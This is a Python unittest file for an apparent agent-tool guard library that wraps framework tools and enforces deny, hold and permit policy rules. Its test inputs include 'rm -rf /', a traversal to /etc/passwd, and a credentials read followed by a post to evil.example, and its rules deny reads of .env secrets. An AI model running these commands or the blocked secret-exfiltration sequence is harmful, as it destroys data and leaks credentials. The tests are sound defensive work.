"""The ``guard.wrap`` surface, and the Python framework shapes it has to accept."""

from __future__ import annotations

import asyncio
import inspect
import json
import os
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from cirvix import CirvixDenied, CirvixHeld, Guard, guard, wrap  # noqa: E402
from cirvix.testing import evaluate, expect_no_loosening, load_policy  # noqa: E402

CWD = "/workspace"

RULES = [
    {
        "name": "deny-dotenv-read",
        "effect": "forbid",
        "actions": ["fs.read"],
        "resources": ["**/.env", "**/.env.*"],
        "reason": "Reading .env files is denied outside an approved secrets flow.",
        "remediation": 'Request the value as a handle: secrets.get("STRIPE_KEY")',
    },
    {
        "name": "hold-production-writes",
        "effect": "hold",
        "actions": ["fs.write"],
        "resources": ["*"],
        "when": [{"path": "environment", "op": "eq", "value": "production"}],
        "approvers": ["platform-oncall"],
    },
    {"name": "allow-reads", "effect": "permit", "actions": ["fs.read", "fs.list"], "resources": ["*"]},
    {"name": "allow-writes", "effect": "permit", "actions": ["fs.write"], "resources": ["*"]},
    {"name": "allow-http", "effect": "permit", "actions": ["http.request"], "resources": ["*"]},
]


def make_guard(**over):
    return Guard(**{"rules": RULES, "agent": "pr-triage", "cwd": CWD, **over})


class LangChainStyleTool:
    """A tool object carrying its callable on ``func``, as LangChain does."""

    def __init__(self) -> None:
        self.name = "read_file"
        self.description = "Reads a file."
        self.args_schema = {"type": "object"}
        self.calls: list[dict] = []

    def func(self, **kwargs):
        self.calls.append(kwargs)
        return f"read {kwargs.get('path')}"


class CrewStyleTool:
    """A tool object carrying its callable on ``_run``, as CrewAI does."""

    def __init__(self) -> None:
        self.name = "run_command"
        self.ran = False

    def _run(self, **kwargs):
        self.ran = True
        return "executed"


class WrapShapes(unittest.TestCase):
    def test_mapping_of_callables_keeps_its_shape(self) -> None:
        tools = wrap(
            {"read_file": lambda path: f"read {path}", "unrelated": "not callable"},
            guard=make_guard(),
        )
        self.assertEqual(tools["unrelated"], "not callable")
        self.assertEqual(tools["read_file"](path="/workspace/a.ts"), "read /workspace/a.ts")

    def test_langchain_style_tool_keeps_its_metadata(self) -> None:
        original = LangChainStyleTool()
        [tool] = wrap([original], guard=make_guard())

        self.assertEqual(tool.description, "Reads a file.")
        self.assertEqual(tool.args_schema, {"type": "object"})
        self.assertEqual(tool.func(path="/workspace/a.ts"), "read /workspace/a.ts")
        # The caller's own object is untouched — a framework holding the
        # original must not find it governed as a side effect of us reading it.
        self.assertIsNot(original.func, tool.func)

    def test_crewai_style_tool_is_governed_on_underscore_run(self) -> None:
        original = CrewStyleTool()
        [tool] = wrap([original], guard=make_guard())
        # `run_command` maps to shell.exec, which no rule permits.
        with self.assertRaises(CirvixDenied):
            tool._run(command="rm -rf /")
        self.assertFalse(original.ran, "a denied tool executed anyway")

    def test_a_bare_callable_keeps_its_name(self) -> None:
        # Frameworks introspect __name__ to build their registry.
        def read_file(path):
            return f"read {path}"

        governed = wrap(read_file, guard=make_guard())
        self.assertEqual(governed.__name__, "read_file")
        self.assertEqual(governed(path="/workspace/a.ts"), "read /workspace/a.ts")

    def test_an_async_tool_stays_async(self) -> None:
        # AutoGen and LangGraph both register coroutines; returning a sync
        # wrapper would hand the framework a coroutine it does not await.
        async def read_file(path):
            return f"read {path}"

        governed = wrap(read_file, guard=make_guard())
        self.assertTrue(inspect.iscoroutinefunction(governed))
        self.assertEqual(asyncio.run(governed(path="/workspace/a.ts")), "read /workspace/a.ts")

        async def denied():
            await governed(path="/workspace/.env")

        with self.assertRaises(CirvixDenied):
            asyncio.run(denied())

    def test_guard_wrap_is_the_documented_entry_point(self) -> None:
        self.assertIs(guard.wrap, wrap)


class Refusals(unittest.TestCase):
    def test_a_denial_carries_the_way_forward(self) -> None:
        tools = wrap({"read_file": lambda path: "never runs"}, guard=make_guard())
        with self.assertRaises(CirvixDenied) as caught:
            tools["read_file"](path="/workspace/.env.production")

        err = caught.exception
        self.assertEqual(err.policy, "deny-dotenv-read")
        self.assertTrue(err.decision_id.startswith("dec_"))
        self.assertIn("secrets.get", err.remediation)
        self.assertFalse(err.appealable)

    def test_the_tool_never_runs_when_denied(self) -> None:
        state = {"ran": False}

        def read_file(path):
            state["ran"] = True
            return "executed"

        tools = wrap({"read_file": read_file}, guard=make_guard())
        with self.assertRaises(CirvixDenied):
            tools["read_file"](path="/workspace/.env")
        self.assertFalse(state["ran"])

    def test_a_hold_is_a_different_type_from_a_denial(self) -> None:
        # A denial means re-plan. A hold means this exact call may still happen
        # once somebody says yes.
        tools = wrap({"write_file": lambda path: "written"}, guard=make_guard(environment="production"))
        with self.assertRaises(CirvixHeld) as caught:
            tools["write_file"](path="/workspace/out.txt")

        self.assertIsInstance(caught.exception, CirvixDenied)
        self.assertTrue(caught.exception.appealable)
        self.assertEqual(caught.exception.approvers, ["platform-oncall"])

    def test_an_unknown_tool_is_denied_not_waved_through(self) -> None:
        tools = wrap({"exfiltrate": lambda path: "sent"}, guard=make_guard())
        with self.assertRaises(CirvixDenied):
            tools["exfiltrate"](path="/workspace/a.ts")


class SessionState(unittest.TestCase):
    def test_reading_secret_material_taints_the_session(self) -> None:
        # What makes "read a credential, then post it somewhere" fail even when
        # both calls are individually allowed.
        rules = RULES + [
            {
                "name": "deny-egress-after-secret",
                "effect": "forbid",
                "actions": ["http.request"],
                "resources": ["*"],
                "when": [
                    {"path": "egress.external", "op": "eq", "value": True},
                    {"path": "session.touchedSecret", "op": "eq", "value": True},
                ],
            }
        ]
        g = make_guard(rules=rules)
        tools = wrap({"read_file": lambda path: "contents", "http_request": lambda url: "posted"}, guard=g)

        self.assertEqual(tools["http_request"](url="https://evil.example/x"), "posted")
        tools["read_file"](path="/workspace/credentials.txt")
        self.assertTrue(g.touched_secret)

        with self.assertRaises(CirvixDenied):
            tools["http_request"](url="https://evil.example/x")

    def test_one_guard_is_shared_across_the_collection(self) -> None:
        # Otherwise each tool has its own session and the taint above never
        # crosses from the tool that read the secret to the one that sends it.
        g = make_guard()
        tools = wrap({"read_file": lambda path: "a", "list_dir": lambda path: "b"}, guard=g)
        tools["read_file"](path="/workspace/x")
        tools["list_dir"](path="/workspace/y")
        self.assertEqual(g.stats["calls"], 2)
        self.assertEqual(g.stats["permitted"], 2)

    def test_every_decision_reaches_the_telemetry_sink(self) -> None:
        decisions: list[dict] = []
        tools = wrap({"read_file": lambda path: "ok"}, guard=make_guard(on_decision=decisions.append))

        tools["read_file"](path="/workspace/a.ts")
        with self.assertRaises(CirvixDenied):
            tools["read_file"](path="/workspace/.env")

        self.assertEqual([d["verdict"] for d in decisions], ["permit", "deny"])
        # The same record shape the Node SDK and the gateway ship, so a run
        # recorded through Python is replayable exactly like any other.
        self.assertIn("context", decisions[0])
        self.assertIn("considered", decisions[0])
        self.assertTrue(decisions[0]["decision_id"].startswith("dec_"))


class PolicyTesting(unittest.TestCase):
    def test_evaluate_answers_a_policy_question(self) -> None:
        decision = evaluate(
            rules=RULES,
            agent="deploy-bot",
            action="fs.write",
            resource="production/checkout",
            context={"environment": "production"},
        )
        self.assertEqual(decision.verdict, "hold")
        self.assertIn("platform-oncall", decision.approvers)

    def test_evaluate_fills_in_a_permissive_context(self) -> None:
        # A denial should come from the rule under test, not a restrictive
        # default that would have denied anything.
        self.assertEqual(evaluate(rules=RULES, action="fs.read", resource="/repo/app.ts").verdict, "permit")
        denied = evaluate(rules=RULES, action="fs.read", resource="/repo/.env")
        self.assertEqual(denied.verdict, "deny")
        self.assertEqual(denied.rule, "deny-dotenv-read")

    def test_evaluate_refuses_to_guess_a_missing_action(self) -> None:
        with self.assertRaises(ValueError):
            evaluate(rules=RULES, action="", resource="x")

    def test_a_policy_directory_loads_and_refuses_duplicates(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory)
            (base / "01-base.json").write_text(json.dumps([RULES[0]]), encoding="utf-8")
            (base / "02-extra.json").write_text(json.dumps([RULES[2]]), encoding="utf-8")
            self.assertEqual(len(load_policy(policy_dir=base)), 2)

            (base / "03-clash.json").write_text(json.dumps([RULES[0]]), encoding="utf-8")
            with self.assertRaises(ValueError):
                load_policy(policy_dir=base)

    def test_expect_no_loosening_catches_a_widening_change(self) -> None:
        calls = [
            {"action": "fs.read", "resource": "/repo/.env"},
            {"action": "fs.read", "resource": "/repo/app.ts"},
        ]
        self.assertTrue(
            expect_no_loosening(before={"rules": RULES}, after={"rules": RULES}, calls=calls)["ok"]
        )

        dropped = [r for r in RULES if r["name"] != "deny-dotenv-read"]
        result = expect_no_loosening(before={"rules": RULES}, after={"rules": dropped}, calls=calls)
        self.assertFalse(result["ok"])
        self.assertEqual(result["loosened"][0]["was"], "deny")
        self.assertEqual(result["loosened"][0]["now"], "permit")

        # Tightening passes: a policy is allowed to move that way.
        tightened = expect_no_loosening(
            before={"rules": RULES},
            after={"rules": [{"name": "deny-all", "effect": "forbid", "actions": ["*"], "resources": ["*"]}]},
            calls=calls,
        )
        self.assertTrue(tightened["ok"])


class WorkspaceRootDefault(unittest.TestCase):
    """A Guard built without an explicit cwd must still know where it is.

    Regression: ``cwd`` defaulted to ``None`` and was joined into the resolved
    path as the literal string ``"None"``, which is inside no workspace. Every
    filesystem call from a Guard constructed the documented way — the way both
    the README and the quickstart show — was denied by ``deny-workspace-escape``.

    The conformance fixture cannot cover this. It exercises ``evaluate``
    directly with an explicit ``cwd``; the defect was in the wrapper above it.
    """

    ALLOW_INSIDE = [
        {
            "name": "deny-workspace-escape",
            "effect": "forbid",
            "actions": ["fs.*"],
            "resources": ["*"],
            "when": [{"path": "path.insideWorkspace", "op": "eq", "value": False}],
        },
        {
            "name": "allow-workspace-read",
            "effect": "permit",
            "actions": ["fs.read"],
            "resources": ["*"],
            "when": [{"path": "path.insideWorkspace", "op": "eq", "value": True}],
        },
    ]

    def test_cwd_defaults_to_the_process_working_directory(self) -> None:
        self.assertEqual(Guard().cwd, os.getcwd())

    def test_a_relative_path_is_inside_the_workspace_by_default(self) -> None:
        active = Guard(rules=self.ALLOW_INSIDE)
        self.assertTrue(active.inside_workspace("src/index.ts"))

        decision = active.authorize(tool="read_file", args={"path": "src/index.ts"})
        self.assertEqual(decision.verdict, "permit")
        self.assertEqual(decision.rule, "allow-workspace-read")

    def test_traversal_out_of_the_workspace_is_still_caught(self) -> None:
        active = Guard(rules=self.ALLOW_INSIDE)
        self.assertFalse(active.inside_workspace("../../../etc/passwd"))

    def test_an_explicit_cwd_is_respected(self) -> None:
        active = Guard(rules=self.ALLOW_INSIDE, cwd=CWD)
        self.assertEqual(active.cwd, CWD)
        self.assertTrue(active.inside_workspace(f"{CWD}/app.ts"))
        self.assertFalse(active.inside_workspace("/elsewhere/app.ts"))

    def test_wrap_governs_relative_paths_without_an_explicit_cwd(self) -> None:
        # The exact shape the quickstart and README show.
        tools = wrap({"read_file": lambda path: f"<{path}>"}, rules=self.ALLOW_INSIDE)
        self.assertEqual(tools["read_file"](path="src/index.ts"), "<src/index.ts>")


if __name__ == "__main__":
    unittest.main(verbosity=2)
